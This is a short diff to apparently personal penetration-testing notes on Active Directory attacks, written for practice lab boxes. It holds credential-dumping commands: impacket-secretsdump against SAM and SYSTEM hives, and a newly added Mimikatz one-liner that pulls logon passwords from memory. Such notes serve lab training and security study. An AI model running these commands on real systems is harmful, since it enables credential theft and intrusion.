@@ -1,7 +1,7 @@
 # AD attacks
 
 ## Credfiles
-Could be in the xxmap folder, dump SAM, a sql data base, look for everything!
+Could be in the xxamp folder, dump SAM, a sql data base, look for everything!
 ```
 UnattendedInstallFiles --> check for this with PowerUp
 ```
@@ -21,6 +21,14 @@ download system
 Then run impacket secertdumps:
 ```
 impacket-secretsdump -sam sam -system system LOCAL
+```
+
+## Mimikatz:
+
+I have found it hard in most boxes in proving grounds, but this command works instead. 
+```
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+
 ```
 
 
